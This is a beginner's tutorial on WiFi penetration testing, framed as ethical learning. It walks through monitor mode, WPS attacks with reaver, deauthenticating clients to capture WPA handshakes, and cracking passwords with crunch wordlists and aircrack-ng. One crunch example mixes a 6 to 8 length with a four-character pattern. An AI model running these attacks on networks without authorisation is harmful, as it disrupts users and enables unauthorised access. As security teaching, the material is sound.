## Introduction

Welcome to the WiFi Penetration Testing Guide! This guide is designed with beginners in mind and walks you through the basics of wireless network analysis and penetration testing using common tools. Always remember: ethical testing only!

---

## Prerequisites

Before you begin, ensure you have:
- **Operating System:** A Linux distribution (Kali Linux is highly recommended for beginners).
- **Wireless Adapter:** An adapter that supports monitor mode and packet injection.
- **Required Tools:** Tools such as `aircrack-ng suite`, `wash`, `reaver`, and `crunch` should be installed.
- **Basic Command Line Skills:** Familiarity with using the Linux terminal will help you follow along.

## Setting Up Monitor Mode

Monitor mode allows your wireless adapter to capture all traffic within range.

### 1. List Available Interfaces
```bash
iwconfig
```
This command displays all available wireless devices.

### 2. Disable the Interface

Replace `wlan1` with your adapter's name.
```bash
ifconfig wlan1 down
```

### 3. Stop Interfering Processes
```bash
airmon-ng check kill
```
This stops processes that might interfere with monitor mode.

### 4. Enable Monitor Mode
```bash
iwconfig wlan1 mode monitor
```

### 5. Re-enable the Interface
```bash
ifconfig wlan1 up
```

### 6. Verify Monitor Mode
Run `iwconfig` again to confirm that your interface is now in monitor mode.

---

## Network Scanning

With your adapter in monitor mode, you can now scan for nearby networks.

### Scan 2.4 GHz Networks
```bash
airodump-ng wlan1
```

### Scan 5 GHz Networks
```bash
airodump-ng --band a wlan1
```

### Scan Both Bands (2.4 GHz & 5 GHz)
```bash
airodump-ng --band abg wlan1
```

### Capture Scan Data
Replace `<target_mac>` with the network's MAC address and `<channel>` with its channel.
```bash
airodump-ng --bssid <target_mac> --channel <channel> --write capture_file wlan1
```
This command saves the scan results to a file for further analysis.

## Performing WPS Attacks

WPS attacks target routers with Wi-Fi Protected Setup enabled. This section explains the process step-by-step.

### 1. Identify Networks with WPS Enabled
```bash
wash --interface wlan1
```
This lists nearby networks that support WPS.

### 2. Execute a WPS Attack
Replace `<target_mac>` and `<channel>` with the appropriate values.
```bash
reaver --bssid <target_mac> --channel <channel> --interface wlan1 -vvv --no-associate
```
- **`-vvv`:** Enables detailed output, helpful for understanding what’s happening.
- **`--no-associate`:** Uses manual association, which can sometimes yield better results.

## Capturing WPA/WPA2 Handshakes

Capturing the handshake between a router and a connected client is key to testing WPA/WPA2 security.

### 1. Start Handshake Capture
Replace `<target_mac>` and `<channel>` with your target’s details.
```bash
airodump-ng --bssid <target_mac> --channel <channel> --write wpa_handshake wlan1
```
Let this command run until a handshake is captured.

### 2. Accelerate Handshake Capture with Deauthentication
Force a connected client to reconnect by deauthenticating them:
```bash
aireplay-ng --deauth 4 -a <target_mac> -c <client_mac> wlan1
```
- **`-a`:** Specifies the target network's MAC address.
- **`-c`:** Specifies the client's MAC address.

---

## Cracking WPA/WPA2 Passwords

Once a handshake is captured, you can attempt to crack the network password using a wordlist.

### 1. Generate a Wordlist Using Crunch
For example, to create a wordlist for passwords of length 6 to 8:
```bash
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
```
You can also incorporate patterns:
```bash
crunch 6 8 abc123 -t @@@@ -o wordlist.txt
```

### 2. Crack the Password with Aircrack-ng
```bash
aircrack-ng wpa_handshake-01.cap -w wordlist.txt
```
- **`wpa_handshake-01.cap`:** The file containing the captured handshake.
- **`wordlist.txt`:** Your generated wordlist.

Aircrack-ng will try each password from the wordlist against the handshake until a match is found.

Remember, this guide is designed to help you learn and practice ethical WiFi testing. **Don't get yourselves arrested, folks—always test only on networks you have permission to access!**
